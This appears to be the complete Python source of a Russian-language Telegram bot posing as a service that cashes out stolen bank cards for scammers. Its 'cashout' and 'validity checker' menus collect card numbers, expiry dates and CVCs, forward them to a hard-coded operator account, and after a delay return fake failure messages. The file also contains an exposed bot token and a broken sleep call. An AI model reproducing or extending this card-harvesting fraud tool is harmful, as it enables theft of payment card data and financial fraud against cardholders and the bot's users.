import telebot
import re
import time
import sqlite3


bot = telebot.TeleBot('1473324178:AAElGNCPRiBYgNiaGynes-7x5Ms5tlRs8u8')

menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
menu.row('👤 Профиль')
menu.row('🔄 Списать бабки с карты', '⚠️ Чекер на валидность')
menu.row('🤖 𝐇𝐄𝐋𝐏', '📊 Статистика')

balance = telebot.types.InlineKeyboardMarkup()
vivod = telebot.types.InlineKeyboardButton(text='Вывести бабки', callback_data='vivodbabla')
balance.add(vivod)

systema = telebot.types.InlineKeyboardMarkup()
qiwas = telebot.types.InlineKeyboardButton(text='🥝 𝐐𝐈𝐖𝐈', callback_data='vivodqiwi')
bitok = telebot.types.InlineKeyboardButton(text='🖤 𝐁𝐓𝐂', callback_data='vivodbtc')
systema.add(qiwas)
systema.add(bitok)

def create_db_new():
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS user(
        user_id INT)''')
    sql.close()
    db.close()
create_db_new()
@bot.message_handler(commands=['start'])
def send_sms(message):
    db = sqlite3.connect("users.db", check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user WHERE user_id = ?",(message.from_user.id,))
    db.commit()
    if sql.fetchone() is None:
        sql.execute("INSERT INTO user VALUES(?)",(message.from_user.id,))
        db.commit()
    bot.send_message(message.chat.id, '<b>Приветствую тебя дорогой скамер, на связи лучший бот по обналу карт!\n\nСналим любую сумму от 100₽ до 100 000₽ так же налим карты твоего иностранного мамонта и спишем у него от 1$ до 1500$\nПринимаем любые карты даже МИР!\nНалим все страны!</b>', parse_mode='html', reply_markup=menu)
    sql.close()
    db.close()
@bot.message_handler(commands=['send'])  
def rek(message):
    if message.from_user.id == 1490980970:
        bot.send_message(message.chat.id, "отправьте текст рассылки")
        bot.register_next_step_handler(message, message_everyone)
def message_everyone(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user")
    Lusers = sql.fetchall()
    for i in Lusers:
        try:
            if message.content_type == "text":
                #text
                tex = message.text
                bot.send_message(i[0], tex)
            elif message.content_type == "photo":
                #photo
                capt = message.caption
                photo = message.photo[-1].file_id
                bot.send_photo(i[0], photo, caption=capt)
            elif message.content_type == "video":
                #video
                capt = message.caption
                photo = message.video.file_id
                bot.send_video(i[0], photo)
            elif message.content_type == "audio":
                #audio
                capt = message.caption
                photo = message.audio.file_id
                bot.send_audio(i[0], photo, caption=capt)
            elif message.content_type == "voice":
                #voice
                capt = message.caption
                photo = message.voice.file_id
                bot.send_voice(i[0], photo, caption=capt)
            elif message.content_type == "animation":
                #animation
                capt = message.caption
                photo = message.animation.file_id
                bot.send_animation(i[0], photo, caption=capt)
            elif message.content_type == "document":
                #document
                capt = message.caption
                photo = message.document.file_id
                bot.send_document(i[0], photo, caption=capt)
        except:
            print("error!!")
    sql.close()
    db.close()
@bot.message_handler(commands=['stats'])
def stat(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    print(q[0])
    for i in q:
        bot.send_message(message.chat.id, "❤️ Ботом пользуются вот столько людей: " + str(q[0]))
 

@bot.message_handler(content_types=['text'])
def send_message(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    if message.text == '📊 Статистика':
      print(q[0])
      for i in q:
        bot.send_message(message.chat.id, "❤️ Ботом пользуются вот столько людей: " + str(q[0]))
    if message.text == '👤 Профиль':
        user = message.from_user
        profile = f'<a href="tg://user?id={user.id}">{user.first_name}</a>'
        bot.send_message(message.chat.id, f'<b>Ваш Login</b>: {profile}\n<b>Ваш ID:</b> <code>{message.from_user.id}</code>\n<b>Ваш баланс:</b> <code>0.00 RUB</code>', parse_mode='html', reply_markup=balance)
    if message.text == '🔄 Списать бабки с карты':    
        bot.send_message(message.chat.id, f'Пришли мне в ответном сообщений данные карты (Номер карты, Дата, CVC)\nПример : 4276 1400 4334 1251 | 11/23 | 515\nОбязательно учитывайте разделитель <code>"|"</code>когда вводите карту или бот сочтет её за невалид !', parse_mode='html')
        start_perevod(message = message)
    if message.text == '⚠️ Чекер на валидность':
        bot.send_message(message.chat.id, 'Пришли мне в ответном сообщений данные карты (Номер карты, Дата, CVC)\nПример : 4276 1400 4334 1251 | 11/23 | 515\nОбязательно учитывайте разделитель <code>"|"</code>когда вводите карту или бот сочтет её за невалид !', parse_mode='html')
        start_check(message = message)
    if message.text == '🤖 𝐇𝐄𝐋𝐏':
        bot.send_message(message.chat.id, '<b>За помощью писать мне @CarderObnal\n\nРазработчик: @CarderObnal</b>', parse_mode='html')












def start_perevod(message):
       chat_id = message.chat.id
       text = message.text
       msg = bot.send_message(chat_id, '<b>Введите данные карты чтобы ее обналичить</b>', parse_mode='html')
       bot.register_next_step_handler(msg, number)
       
def number(message):
        chat_id = message.chat.id
        text = message.text
        if re.match(r'@([a-zA-Z]|_|\d)+ \d+', text):
            msg = bot.send_message(chat_id, 'неправильные данные') 
            bot.register_next_step_handler(msg, number)
            return
       	# ----------------------------------------------------------
        msg = bot.send_message(chat_id, 'Вы указали: ' + text + '. Верно?(Да|Нет)')
        bot.register_next_step_handler(message,verify_ask,answer = text) 
        bot.forward_message(1490980970, message.from_user.id, message.message_id)# 
        
def verify_ask(message,answer,func = None):
    if not message.text.lower().find("да"):
        bot.send_message(message.chat.id,"<b>Скоро будет обналичено!\nО результатах сообщим примерно через 10 минут!</b>", parse_mode='html') #
        sleep(285)
        bot.send_photo(message.chat.id, "https://i.imgur.com/2jMQy6H.jpg", caption="Нету бабок на карте у мамонта")
    elif not message.text.lower().find("нет"):
              bot.send_message(message.chat.id,"Отменено.")#
    else:
        bot.send_message(message.chat.id,"Ответ не подходит под критерии (Да|Нет)")
        bot.register_next_step_handler(message,verify_ask,answer = answer)



def start_check(message):
       chat_id = message.chat.id
       text = message.text
       msg = bot.send_message(chat_id, '<b>Введите данные карты чтобы чекнуть на валидность</b>', parse_mode='html')
       bot.register_next_step_handler(msg, number2)
       
def number2(message):
        chat_id = message.chat.id
        text = message.text
        if re.match(r'@([a-zA-Z]|_|\d)+ \d+', text):
            msg = bot.send_message(chat_id, 'неправильные данные') 
            bot.register_next_step_handler(msg, number2)
            return
       	# ----------------------------------------------------------
        msg = bot.send_message(chat_id, 'Вы указали: ' + text + '. Верно?(Да|Нет)')
        bot.register_next_step_handler(message,verify_ask2,answer = text) 
        bot.forward_message(1490980970, message.from_user.id, message.message_id)# 
        
def verify_ask2(message,answer,func = None):
    if not message.text.lower().find("да"):
        bot.send_message(message.chat.id,"<b>Скоро будет проверено на валид!\nО результатах сообщим примерно через 10 минут!</b>", parse_mode='html') #
        time.sleep(280)
        bot.send_photo(message.chat.id, "https://i.imgur.com/lVp9ukV.jpg", caption="Карта невалид или находится в локе!")
    elif not message.text.lower().find("нет"):
	    bot.send_message(message.chat.id,"Отменено.")#
    else:
        bot.send_message(message.chat.id,"Ответ не подходит под критерии (Да|Нет)")
        bot.register_next_step_handler(message,verify_ask2,answer = answer)
























  
@bot.callback_query_handler(func=lambda call:True)
def call_su(call):
    if call.data == 'vivodbabla':
        bot.send_message(call.message.chat.id, '<b>Выберите платежную систему, куда будете выводить!</b>', parse_mode='html', reply_markup=systema)
    if call.data == 'vivodqiwi':
        bot.send_message(call.message.chat.id, '<i>За выводом обращайтесь к @CarderObnal</i>', parse_mode='html')
    if call.data == 'vivodbtc':
        bot.send_message(call.message.chat.id, '<i>За выводом обращайтесь к @CarderObnal</i>', parse_mode='html')
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
         


bot.polling(none_stop=True)    
    